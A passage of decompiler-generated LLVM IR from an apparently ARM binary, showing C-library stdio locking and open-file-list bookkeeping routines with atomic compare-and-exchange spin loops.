  %v3_17874 = load i32, i32* %v2_17874, align 4
  store i32 %v3_17874, i32* %r3.global-to-local, align 4
  %v0_17878 = call i32 @__aeabi_read_tp()
  store i32 %v0_17878, i32* %r0.global-to-local, align 4
  %v1_1787c = add i32 %v0_17878, -1168
  store i32 %v1_1787c, i32* %sl.global-to-local, align 4
  %v0_17880 = load i32, i32* %r3.global-to-local, align 4
  %v3_17880 = icmp uge i32 %v0_17880, %v1_1787c
  store i1 %v3_17880, i1* %cpsr_c.global-to-local, align 1
  %v9_17880 = icmp eq i32 %v0_17880, %v1_1787c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_17888 = load i32, i32* @r5, align 4
  %v2_17888 = add i32 %v1_17888, 4
  %v3_17888 = inttoptr i32 %v2_17888 to i32*
  store i32 -1, i32* %v3_17888, align 4
  br i1 %v9_17880, label %dec_label_pc_178d0, label %dec_label_pc_17890

dec_label_pc_17890:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_17894 = load i32, i32* @r7, align 4
  store i32 %v0_17894, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1789c108 = inttoptr i32 %v0_17894 to i32*
  %v2_1789c109 = load i32, i32* %v1_1789c108, align 4
  store i32 %v2_1789c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_178a0111 = icmp eq i32 %v2_1789c109, 0
  br i1 %v9_178a0111, label %dec_label_pc_178a8, label %dec_label_pc_178c0

dec_label_pc_178a8:                               ; preds = %dec_label_pc_17890, %dec_label_pc_178a8.dec_label_pc_1789c_crit_edge
  %v0_178a8112 = phi i32 [ %v1_178a0.pre, %dec_label_pc_178a8.dec_label_pc_1789c_crit_edge ], [ 0, %dec_label_pc_17890 ]
  store i32 %v0_178a8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_178b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_178b8, label %dec_label_pc_178bc, label %dec_label_pc_178a8.dec_label_pc_1789c_crit_edge

dec_label_pc_178a8.dec_label_pc_1789c_crit_edge:  ; preds = %dec_label_pc_178a8
  %v0_1789c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_178a0.pre = load i32, i32* @r4, align 4
  %v1_1789c = inttoptr i32 %v0_1789c.pre to i32*
  %v2_1789c = load i32, i32* %v1_1789c, align 4
  store i32 %v2_1789c, i32* %r3.global-to-local, align 4
  %v3_178a0 = icmp uge i32 %v2_1789c, %v1_178a0.pre
  store i1 %v3_178a0, i1* %cpsr_c.global-to-local, align 1
  %v9_178a0 = icmp eq i32 %v2_1789c, %v1_178a0.pre
  br i1 %v9_178a0, label %dec_label_pc_178a8, label %dec_label_pc_178c0

dec_label_pc_178bc:                               ; preds = %dec_label_pc_178a8
  %v0_178bc = load i32, i32* @r4, align 4
  store i32 %v0_178bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178c0

dec_label_pc_178c0:                               ; preds = %dec_label_pc_17890, %dec_label_pc_178a8.dec_label_pc_1789c_crit_edge, %dec_label_pc_178bc
  %v0_178c0 = phi i32 [ %v0_178bc, %dec_label_pc_178bc ], [ %v2_1789c109, %dec_label_pc_17890 ], [ %v2_1789c, %dec_label_pc_178a8.dec_label_pc_1789c_crit_edge ]
  %v1_178c0 = phi i32 [ %v0_178bc, %dec_label_pc_178bc ], [ 0, %dec_label_pc_17890 ], [ %v1_178a0.pre, %dec_label_pc_178a8.dec_label_pc_1789c_crit_edge ]
  %v3_178c0 = icmp uge i32 %v0_178c0, %v1_178c0
  store i1 %v3_178c0, i1* %cpsr_c.global-to-local, align 1
  %v9_178c0 = icmp eq i32 %v0_178c0, %v1_178c0
  br i1 %v9_178c0, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_178c0
  %v1_178c4 = load i32, i32* @r7, align 4
  store i32 %v1_178c4, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_178c0, %bb46
  %v1_178c8 = xor i1 %v9_178c0, true
  call void @__pseudo_cond_branch(i1 %v1_178c8, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_178cc = load i32, i32* %sl.global-to-local, align 4
  %v1_178cc = load i32, i32* @r7, align 4
  %v2_178cc = add i32 %v1_178cc, 8
  %v3_178cc = inttoptr i32 %v2_178cc to i32*
  store i32 %v0_178cc, i32* %v3_178cc, align 4
  br label %dec_label_pc_178d0

dec_label_pc_178d0:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_178d4 = load i32, i32* @r8, align 4
  %v2_178d4 = add i32 %v0_178d4, 160
  %v3_178d4 = inttoptr i32 %v2_178d4 to i32*
  %v4_178d4 = load i32, i32* %v3_178d4, align 4
  store i32 %v4_178d4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_178dc = add i32 %v0_178d4, 12
  %v3_178dc = inttoptr i32 %v2_178dc to i32*
  %v4_178dc = load i32, i32* %v3_178dc, align 4
  store i32 %v4_178dc, i32* %r2.global-to-local, align 4
  %v1_178e0 = add i32 %v4_178d4, 4
  %v2_178e0 = inttoptr i32 %v1_178e0 to i32*
  %v3_178e0 = load i32, i32* %v2_178e0, align 4
  store i32 %v3_178e0, i32* %r1.global-to-local, align 4
  %v1_178e4 = inttoptr i32 %v4_178dc to i32*
  %v2_178e4 = load i32, i32* %v1_178e4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_178e8 = icmp eq i32 %v3_178e0, 0
  %v1_178ec = add i32 %v2_178e4, 1
  store i32 %v1_178ec, i32* %r3.global-to-local, align 4
  store i32 %v1_178ec, i32* %v1_178e4, align 4
  br i1 %v2_178e8, label %dec_label_pc_178f8, label %dec_label_pc_17958

dec_label_pc_178f8:                               ; preds = %dec_label_pc_178d0
  %v0_178f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_178f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_178f8 = add i32 %v1_178f8, 8
  %v3_178f8 = inttoptr i32 %v2_178f8 to i32*
  store i32 %v0_178f8, i32* %v3_178f8, align 4
  %v0_178fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_178fc, i32* @r7, align 4
  br label %dec_label_pc_17900

dec_label_pc_17900:                               ; preds = %dec_label_pc_17930.dec_label_pc_17900_crit_edge, %dec_label_pc_178f8
  %v0_17900 = phi i32 [ %v0_17900.pre, %dec_label_pc_17930.dec_label_pc_17900_crit_edge ], [ %v0_178fc, %dec_label_pc_178f8 ]
  %v1_17900 = inttoptr i32 %v0_17900 to i32*
  %v2_17900 = load i32, i32* %v1_17900, align 4
  store i32 %v2_17900, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17900, i32* %r2.global-to-local, align 4
  %v2_1790c96 = load i32, i32* %v1_17900, align 4
  store i32 %v2_1790c96, i32* %r3.global-to-local, align 4
  %v3_1791098 = icmp uge i32 %v2_1790c96, %v2_17900
  store i1 %v3_1791098, i1* %cpsr_c.global-to-local, align 1
  %v9_17910104 = icmp eq i32 %v2_1790c96, %v2_17900
  br i1 %v9_17910104, label %dec_label_pc_17918, label %dec_label_pc_17930

dec_label_pc_17918:                               ; preds = %dec_label_pc_17900, %dec_label_pc_17918.dec_label_pc_1790c_crit_edge
  %v0_17918105 = phi i32 [ %v1_17910.pre, %dec_label_pc_17918.dec_label_pc_1790c_crit_edge ], [ %v2_17900, %dec_label_pc_17900 ]
  store i32 %v0_17918105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17928 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17928, label %dec_label_pc_1792c, label %dec_label_pc_17918.dec_label_pc_1790c_crit_edge

dec_label_pc_17918.dec_label_pc_1790c_crit_edge:  ; preds = %dec_label_pc_17918
  %v0_1790c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17910.pre = load i32, i32* @r4, align 4
  %v1_1790c = inttoptr i32 %v0_1790c.pre to i32*
  %v2_1790c = load i32, i32* %v1_1790c, align 4
  store i32 %v2_1790c, i32* %r3.global-to-local, align 4
  %v3_17910 = icmp uge i32 %v2_1790c, %v1_17910.pre
  store i1 %v3_17910, i1* %cpsr_c.global-to-local, align 1
  %v9_17910 = icmp eq i32 %v2_1790c, %v1_17910.pre
  br i1 %v9_17910, label %dec_label_pc_17918, label %dec_label_pc_17930

dec_label_pc_1792c:                               ; preds = %dec_label_pc_17918
  %v0_1792c = load i32, i32* @r4, align 4
  store i32 %v0_1792c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17930

dec_label_pc_17930:                               ; preds = %dec_label_pc_17900, %dec_label_pc_17918.dec_label_pc_1790c_crit_edge, %dec_label_pc_1792c
  %v0_17938 = phi i32 [ %v0_1792c, %dec_label_pc_1792c ], [ %v2_1790c96, %dec_label_pc_17900 ], [ %v2_1790c, %dec_label_pc_17918.dec_label_pc_1790c_crit_edge ]
  %v1_17930 = phi i32 [ %v0_1792c, %dec_label_pc_1792c ], [ %v2_17900, %dec_label_pc_17900 ], [ %v1_17910.pre, %dec_label_pc_17918.dec_label_pc_1790c_crit_edge ]
  %v3_17930 = icmp uge i32 %v0_17938, %v1_17930
  store i1 %v3_17930, i1* %cpsr_c.global-to-local, align 1
  %v9_17930 = icmp eq i32 %v0_17938, %v1_17930
  br i1 %v9_17930, label %dec_label_pc_17938, label %dec_label_pc_17930.dec_label_pc_17900_crit_edge

dec_label_pc_17930.dec_label_pc_17900_crit_edge:  ; preds = %dec_label_pc_17930
  %v0_17900.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17900

dec_label_pc_17938:                               ; preds = %dec_label_pc_17930
  %v2_17938 = icmp ne i32 %v1_17930, 0
  store i1 %v2_17938, i1* %cpsr_c.global-to-local, align 1
  %v7_1793c = icmp slt i32 %v1_17930, 2
  br i1 %v7_1793c, label %dec_label_pc_17958, label %dec_label_pc_17940

dec_label_pc_17940:                               ; preds = %dec_label_pc_17938
  %v0_17940 = load i32, i32* @r7, align 4
  store i32 %v0_17940, i32* %r0.global-to-local, align 4
  %v0_17944 = load i32, i32* %r1.global-to-local, align 4
  %v1_17944 = add i32 %v0_17944, 129
  store i32 %v1_17944, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17958

dec_label_pc_17958:                               ; preds = %dec_label_pc_178d0, %dec_label_pc_17940, %dec_label_pc_17938
  %v0_17958 = load i32, i32* @r5, align 4
  %v1_17958 = inttoptr i32 %v0_17958 to i16*
  %v2_17958 = load i16, i16* %v1_17958, align 2
  %v3_17958 = zext i16 %v2_17958 to i32
  %v1_1795c = and i32 %v3_17958, 24576
  %v1_17960 = or i32 %v1_1795c, 48
  store i32 %v1_17960, i32* %r3.global-to-local, align 4
  %v0_17964 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17964 = icmp eq i32 %v0_17964, 0
  %v1_17968 = trunc i32 %v1_17960 to i16
  store i16 %v1_17968, i16* %v1_17958, align 2
  br i1 %v2_17964, label %dec_label_pc_17970, label %dec_label_pc_179e4

dec_label_pc_17970:                               ; preds = %dec_label_pc_17958
  %v0_17970 = load i32, i32* @r5, align 4
  %v1_17970 = add i32 %v0_17970, 60
  %v2_17970 = inttoptr i32 %v1_17970 to i32*
  %v3_17970 = load i32, i32* %v2_17970, align 4
  %v1_17974 = add i32 %v3_17970, -1
  store i32 %v1_17974, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17978 = icmp eq i32 %v1_17974, 0
  store i32 %v1_17974, i32* %v2_17970, align 4
  br i1 %v2_17978, label %dec_label_pc_17984, label %dec_label_pc_179e4

dec_label_pc_17984:                               ; preds = %dec_label_pc_17970
  %v0_17984 = load i32, i32* %r3.global-to-local, align 4
  %v1_17984 = load i32, i32* @r5, align 4
  %v2_17984 = add i32 %v1_17984, 64
  %v3_17984 = inttoptr i32 %v2_17984 to i32*
  store i32 %v0_17984, i32* %v3_17984, align 4
  %v0_17988 = load i32, i32* @r5, align 4
  %v1_17988 = add i32 %v0_17988, 56
  store i32 %v1_17988, i32* @r6, align 4
  br label %dec_label_pc_1798c

dec_label_pc_1798c:                               ; preds = %dec_label_pc_179bc.dec_label_pc_1798c_crit_edge, %dec_label_pc_17984
  %v0_17994 = phi i32 [ %v0_17994.pre, %dec_label_pc_179bc.dec_label_pc_1798c_crit_edge ], [ %v1_17988, %dec_label_pc_17984 ]
  %v0_1798c = phi i32 [ %v0_1798c.pre, %dec_label_pc_179bc.dec_label_pc_1798c_crit_edge ], [ %v0_17988, %dec_label_pc_17984 ]
  %v1_1798c = add i32 %v0_1798c, 56
  %v2_1798c = inttoptr i32 %v1_1798c to i32*
  %v3_1798c = load i32, i32* %v2_1798c, align 4
  store i32 %v3_1798c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17994, i32* %r2.global-to-local, align 4
  %v1_1799882 = inttoptr i32 %v0_17994 to i32*
  %v2_1799883 = load i32, i32* %v1_1799882, align 4
  store i32 %v2_1799883, i32* %r3.global-to-local, align 4
  %v3_1799c85 = icmp uge i32 %v2_1799883, %v3_1798c
  store i1 %v3_1799c85, i1* %cpsr_c.global-to-local, align 1
  %v9_1799c91 = icmp eq i32 %v2_1799883, %v3_1798c
  br i1 %v9_1799c91, label %dec_label_pc_179a4, label %dec_label_pc_179bc

dec_label_pc_179a4:                               ; preds = %dec_label_pc_1798c, %dec_label_pc_179a4.dec_label_pc_17998_crit_edge
  %v0_179a492 = phi i32 [ %v1_1799c.pre, %dec_label_pc_179a4.dec_label_pc_17998_crit_edge ], [ %v3_1798c, %dec_label_pc_1798c ]
  store i32 %v0_179a492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_179b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_179b4, label %dec_label_pc_179b8, label %dec_label_pc_179a4.dec_label_pc_17998_crit_edge

dec_label_pc_179a4.dec_label_pc_17998_crit_edge:  ; preds = %dec_label_pc_179a4
  %v0_17998.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1799c.pre = load i32, i32* @r4, align 4
  %v1_17998 = inttoptr i32 %v0_17998.pre to i32*
  %v2_17998 = load i32, i32* %v1_17998, align 4
  store i32 %v2_17998, i32* %r3.global-to-local, align 4
  %v3_1799c = icmp uge i32 %v2_17998, %v1_1799c.pre
  store i1 %v3_1799c, i1* %cpsr_c.global-to-local, align 1
  %v9_1799c = icmp eq i32 %v2_17998, %v1_1799c.pre
  br i1 %v9_1799c, label %dec_label_pc_179a4, label %dec_label_pc_179bc

dec_label_pc_179b8:                               ; preds = %dec_label_pc_179a4
  %v0_179b8 = load i32, i32* @r4, align 4
  store i32 %v0_179b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179bc

dec_label_pc_179bc:                               ; preds = %dec_label_pc_1798c, %dec_label_pc_179a4.dec_label_pc_17998_crit_edge, %dec_label_pc_179b8
  %v0_179c4 = phi i32 [ %v0_179b8, %dec_label_pc_179b8 ], [ %v2_1799883, %dec_label_pc_1798c ], [ %v2_17998, %dec_label_pc_179a4.dec_label_pc_17998_crit_edge ]
  %v1_179bc = phi i32 [ %v0_179b8, %dec_label_pc_179b8 ], [ %v3_1798c, %dec_label_pc_1798c ], [ %v1_1799c.pre, %dec_label_pc_179a4.dec_label_pc_17998_crit_edge ]
  %v3_179bc = icmp uge i32 %v0_179c4, %v1_179bc
  store i1 %v3_179bc, i1* %cpsr_c.global-to-local, align 1
  %v9_179bc = icmp eq i32 %v0_179c4, %v1_179bc
  br i1 %v9_179bc, label %dec_label_pc_179c4, label %dec_label_pc_179bc.dec_label_pc_1798c_crit_edge

dec_label_pc_179bc.dec_label_pc_1798c_crit_edge:  ; preds = %dec_label_pc_179bc
  %v0_1798c.pre = load i32, i32* @r5, align 4
  %v0_17994.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1798c

dec_label_pc_179c4:                               ; preds = %dec_label_pc_179bc
  %v2_179c4 = icmp ne i32 %v1_179bc, 0
  store i1 %v2_179c4, i1* %cpsr_c.global-to-local, align 1
  %v7_179c8 = icmp slt i32 %v1_179bc, 2
  br i1 %v7_179c8, label %dec_label_pc_179e4, label %dec_label_pc_179cc

dec_label_pc_179cc:                               ; preds = %dec_label_pc_179c4
  %v0_179cc = load i32, i32* @r5, align 4
  %v1_179cc = add i32 %v0_179cc, 56
  store i32 %v1_179cc, i32* %r0.global-to-local, align 4
  %v0_179d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_179d0 = add i32 %v0_179d0, 129
  store i32 %v1_179d0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179e4

dec_label_pc_179e4:                               ; preds = %dec_label_pc_17970, %dec_label_pc_17958, %dec_label_pc_179cc, %dec_label_pc_179c4
  %v0_179e4 = load i32, i32* @r5, align 4
  %v1_179e4 = inttoptr i32 %v0_179e4 to i16*
  %v2_179e4 = load i16, i16* %v1_179e4, align 2
  %v3_179e4 = zext i16 %v2_179e4 to i32
  store i32 %v3_179e4, i32* %r3.global-to-local, align 4
  %v1_179e8 = and i32 %v3_179e4, 16384
  %v2_179e8 = icmp eq i32 %v1_179e8, 0
  br i1 %v2_179e8, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_179e4
  %v2_179ec = add i32 %v0_179e4, 8
  %v3_179ec = inttoptr i32 %v2_179ec to i32*
  %v4_179ec = load i32, i32* %v3_179ec, align 4
  store i32 %v4_179ec, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_179e4, %bb48
  %v1_179f0 = xor i1 %v2_179e8, true
  call void @__pseudo_cond_branch(i1 %v1_179f0, i32 ptrtoint (i32* @global_var_1504c.63 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_179f8 = load i32, i32* @r8, align 4
  %v2_179f8 = add i32 %v0_179f8, 160
  %v3_179f8 = inttoptr i32 %v2_179f8 to i32*
  %v4_179f8 = load i32, i32* %v3_179f8, align 4
  store i32 %v4_179f8, i32* @r5, align 4
  %v1_179fc = add i32 %v4_179f8, 8
  %v2_179fc = inttoptr i32 %v1_179fc to i32*
  %v3_179fc = load i32, i32* %v2_179fc, align 4
  store i32 %v3_179fc, i32* %r3.global-to-local, align 4
  %v1_17a00 = load i32, i32* %sl.global-to-local, align 4
  %v3_17a00 = icmp uge i32 %v3_179fc, %v1_17a00
  store i1 %v3_17a00, i1* %cpsr_c.global-to-local, align 1
  %v9_17a00 = icmp eq i32 %v3_179fc, %v1_17a00
  br i1 %v9_17a00, label %dec_label_pc_17a48, label %dec_label_pc_17a08

dec_label_pc_17a08:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_179f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17a1475 = inttoptr i32 %v4_179f8 to i32*
  %v2_17a1476 = load i32, i32* %v1_17a1475, align 4
  store i32 %v2_17a1476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17a1878 = icmp eq i32 %v2_17a1476, 0
  br i1 %v9_17a1878, label %dec_label_pc_17a20, label %dec_label_pc_17a38

dec_label_pc_17a20:                               ; preds = %dec_label_pc_17a08, %dec_label_pc_17a20.dec_label_pc_17a14_crit_edge
  %v0_17a2079 = phi i32 [ %v1_17a18.pre, %dec_label_pc_17a20.dec_label_pc_17a14_crit_edge ], [ 0, %dec_label_pc_17a08 ]
  store i32 %v0_17a2079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17a30 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17a30, label %dec_label_pc_17a34, label %dec_label_pc_17a20.dec_label_pc_17a14_crit_edge

dec_label_pc_17a20.dec_label_pc_17a14_crit_edge:  ; preds = %dec_label_pc_17a20
  %v0_17a14.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a18.pre = load i32, i32* @r4, align 4
  %v1_17a14 = inttoptr i32 %v0_17a14.pre to i32*
  %v2_17a14 = load i32, i32* %v1_17a14, align 4
  store i32 %v2_17a14, i32* %r3.global-to-local, align 4
  %v3_17a18 = icmp uge i32 %v2_17a14, %v1_17a18.pre
  store i1 %v3_17a18, i1* %cpsr_c.global-to-local, align 1
  %v9_17a18 = icmp eq i32 %v2_17a14, %v1_17a18.pre
  br i1 %v9_17a18, label %dec_label_pc_17a20, label %dec_label_pc_17a38

dec_label_pc_17a34:                               ; preds = %dec_label_pc_17a20
  %v0_17a34 = load i32, i32* @r4, align 4
  store i32 %v0_17a34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a38

dec_label_pc_17a38:                               ; preds = %dec_label_pc_17a08, %dec_label_pc_17a20.dec_label_pc_17a14_crit_edge, %dec_label_pc_17a34
  %v0_17a38 = phi i32 [ %v0_17a34, %dec_label_pc_17a34 ], [ %v2_17a1476, %dec_label_pc_17a08 ], [ %v2_17a14, %dec_label_pc_17a20.dec_label_pc_17a14_crit_edge ]
  %v1_17a38 = phi i32 [ %v0_17a34, %dec_label_pc_17a34 ], [ 0, %dec_label_pc_17a08 ], [ %v1_17a18.pre, %dec_label_pc_17a20.dec_label_pc_17a14_crit_edge ]
  %v3_17a38 = icmp uge i32 %v0_17a38, %v1_17a38
  store i1 %v3_17a38, i1* %cpsr_c.global-to-local, align 1
  %v9_17a38 = icmp eq i32 %v0_17a38, %v1_17a38
  br i1 %v9_17a38, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_17a38
  %v1_17a3c = load i32, i32* @r5, align 4
  store i32 %v1_17a3c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_17a38, %bb50
  %v1_17a40 = xor i1 %v9_17a38, true
  call void @__pseudo_cond_branch(i1 %v1_17a40, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_17a44 = load i32, i32* %sl.global-to-local, align 4
  %v1_17a44 = load i32, i32* @r5, align 4
  %v2_17a44 = add i32 %v1_17a44, 8
  %v3_17a44 = inttoptr i32 %v2_17a44 to i32*
  store i32 %v0_17a44, i32* %v3_17a44, align 4
  %v0_17a4c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_17a48

dec_label_pc_17a48:                               ; preds = %bb49, %bb51
  %v0_17a4c = phi i32 [ %v0_179f8, %bb49 ], [ %v0_17a4c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_17a4c = add i32 %v0_17a4c, 80
  %v3_17a4c = inttoptr i32 %v2_17a4c to i32*
  %v4_17a4c = load i32, i32* %v3_17a4c, align 4
  store i32 %v4_17a4c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_17a54 = add i32 %v0_17a4c, 160
  %v3_17a54 = inttoptr i32 %v2_17a54 to i32*
  %v4_17a54 = load i32, i32* %v3_17a54, align 4
  store i32 %v4_17a54, i32* %r0.global-to-local, align 4
  %v1_17a58 = inttoptr i32 %v4_17a4c to i32*
  %v2_17a58 = load i32, i32* %v1_17a58, align 4
  store i32 %v2_17a58, i32* %r3.global-to-local, align 4
  %v1_17a5c = add i32 %v4_17a54, 4
  %v2_17a5c = inttoptr i32 %v1_17a5c to i32*
  %v3_17a5c = load i32, i32* %v2_17a5c, align 4
  store i32 %v3_17a5c, i32* %r1.global-to-local, align 4
  %v1_17a60 = add i32 %v2_17a58, 1
  store i32 %v1_17a60, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17a64 = icmp eq i32 %v3_17a5c, 0
  store i32 %v1_17a60, i32* %v1_17a58, align 4
  br i1 %v2_17a64, label %dec_label_pc_17a70, label %dec_label_pc_17ad0

dec_label_pc_17a70:                               ; preds = %dec_label_pc_17a48
  %v0_17a70 = load i32, i32* %r1.global-to-local, align 4
  %v1_17a70 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a70 = add i32 %v1_17a70, 8
  %v3_17a70 = inttoptr i32 %v2_17a70 to i32*
  store i32 %v0_17a70, i32* %v3_17a70, align 4
  %v0_17a74 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17a74, i32* @r5, align 4
  br label %dec_label_pc_17a78

dec_label_pc_17a78:                               ; preds = %dec_label_pc_17aa8.dec_label_pc_17a78_crit_edge, %dec_label_pc_17a70
  %v0_17a78 = phi i32 [ %v0_17a78.pre, %dec_label_pc_17aa8.dec_label_pc_17a78_crit_edge ], [ %v0_17a74, %dec_label_pc_17a70 ]
  %v1_17a78 = inttoptr i32 %v0_17a78 to i32*
  %v2_17a78 = load i32, i32* %v1_17a78, align 4
  store i32 %v2_17a78, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17a78, i32* %r2.global-to-local, align 4
  %v2_17a8464 = load i32, i32* %v1_17a78, align 4
  store i32 %v2_17a8464, i32* %r3.global-to-local, align 4
  %v3_17a8866 = icmp uge i32 %v2_17a8464, %v2_17a78
  store i1 %v3_17a8866, i1* %cpsr_c.global-to-local, align 1
  %v9_17a8872 = icmp eq i32 %v2_17a8464, %v2_17a78
  br i1 %v9_17a8872, label %dec_label_pc_17a90, label %dec_label_pc_17aa8

dec_label_pc_17a90:                               ; preds = %dec_label_pc_17a78, %dec_label_pc_17a90.dec_label_pc_17a84_crit_edge
  %v0_17a9073 = phi i32 [ %v1_17a88.pre, %dec_label_pc_17a90.dec_label_pc_17a84_crit_edge ], [ %v2_17a78, %dec_label_pc_17a78 ]
  store i32 %v0_17a9073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17aa0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17aa0, label %dec_label_pc_17aa4, label %dec_label_pc_17a90.dec_label_pc_17a84_crit_edge

dec_label_pc_17a90.dec_label_pc_17a84_crit_edge:  ; preds = %dec_label_pc_17a90
  %v0_17a84.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a88.pre = load i32, i32* @r4, align 4
  %v1_17a84 = inttoptr i32 %v0_17a84.pre to i32*
  %v2_17a84 = load i32, i32* %v1_17a84, align 4
  store i32 %v2_17a84, i32* %r3.global-to-local, align 4
  %v3_17a88 = icmp uge i32 %v2_17a84, %v1_17a88.pre
  store i1 %v3_17a88, i1* %cpsr_c.global-to-local, align 1
  %v9_17a88 = icmp eq i32 %v2_17a84, %v1_17a88.pre
  br i1 %v9_17a88, label %dec_label_pc_17a90, label %dec_label_pc_17aa8

dec_label_pc_17aa4:                               ; preds = %dec_label_pc_17a90
  %v0_17aa4 = load i32, i32* @r4, align 4
  store i32 %v0_17aa4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17aa8

dec_label_pc_17aa8:                               ; preds = %dec_label_pc_17a78, %dec_label_pc_17a90.dec_label_pc_17a84_crit_edge, %dec_label_pc_17aa4
  %v0_17ab0 = phi i32 [ %v0_17aa4, %dec_label_pc_17aa4 ], [ %v2_17a8464, %dec_label_pc_17a78 ], [ %v2_17a84, %dec_label_pc_17a90.dec_label_pc_17a84_crit_edge ]
  %v1_17aa8 = phi i32 [ %v0_17aa4, %dec_label_pc_17aa4 ], [ %v2_17a78, %dec_label_pc_17a78 ], [ %v1_17a88.pre, %dec_label_pc_17a90.dec_label_pc_17a84_crit_edge ]
  %v3_17aa8 = icmp uge i32 %v0_17ab0, %v1_17aa8
  store i1 %v3_17aa8, i1* %cpsr_c.global-to-local, align 1
  %v9_17aa8 = icmp eq i32 %v0_17ab0, %v1_17aa8
  br i1 %v9_17aa8, label %dec_label_pc_17ab0, label %dec_label_pc_17aa8.dec_label_pc_17a78_crit_edge

dec_label_pc_17aa8.dec_label_pc_17a78_crit_edge:  ; preds = %dec_label_pc_17aa8
  %v0_17a78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17a78

dec_label_pc_17ab0:                               ; preds = %dec_label_pc_17aa8
  %v2_17ab0 = icmp ne i32 %v1_17aa8, 0
  store i1 %v2_17ab0, i1* %cpsr_c.global-to-local, align 1
  %v7_17ab4 = icmp slt i32 %v1_17aa8, 2
  br i1 %v7_17ab4, label %dec_label_pc_17ad0, label %dec_label_pc_17ab8

dec_label_pc_17ab8:                               ; preds = %dec_label_pc_17ab0
  %v0_17ab8 = load i32, i32* @r5, align 4
  store i32 %v0_17ab8, i32* %r0.global-to-local, align 4
  %v0_17abc = load i32, i32* %r1.global-to-local, align 4
  %v1_17abc = add i32 %v0_17abc, 129
  store i32 %v1_17abc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17ad0

dec_label_pc_17ad0:                               ; preds = %dec_label_pc_17a48, %dec_label_pc_17ab8, %dec_label_pc_17ab0
  %v0_17ad0 = call i32 @_stdio_openlist_dec_use()
  %v0_17ad4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17ad4, i32* %r0.global-to-local, align 4
  %v2_17adc = load i32, i32* %stack_var_-36, align 4
